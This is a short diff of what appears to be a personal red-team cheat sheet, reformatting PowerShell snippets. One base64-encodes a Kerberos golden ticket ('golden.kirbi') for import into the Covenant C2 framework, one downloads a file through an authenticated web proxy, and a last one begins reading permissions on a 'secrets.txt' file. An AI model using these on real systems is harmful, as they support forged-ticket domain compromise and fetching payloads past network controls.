@@ -340,10 +340,17 @@ SI 0 -> SI >=1?
 
 *****
 
-`[System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\Users\IEUser\Desktop\golden.kirbi"))`
-
-
+**Converting kirbi to base64 for covenant imports
 ```
+[System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\Users\IEUser\Desktop\golden.kirbi"))
+```
+
+
+****
+
+
+**Using a web proxy with (new-object net.webclient)downloadstring:**
+```powershell
 $Username="Hugo"
 $Password="abcdefgh"
 $WebProxy = New-Object System.Net.WebProxy("http://webproxy:8080",$true)
@@ -359,8 +366,7 @@ $WebClient.DownloadFile($url, $path)
 ```
 
 ***
-
-weird file permissions:
+**weird file permissions:**
 ```powershell
 $path = C:\Users\administrator\Desktop\secrets.txt
 $acl=get-acl $path
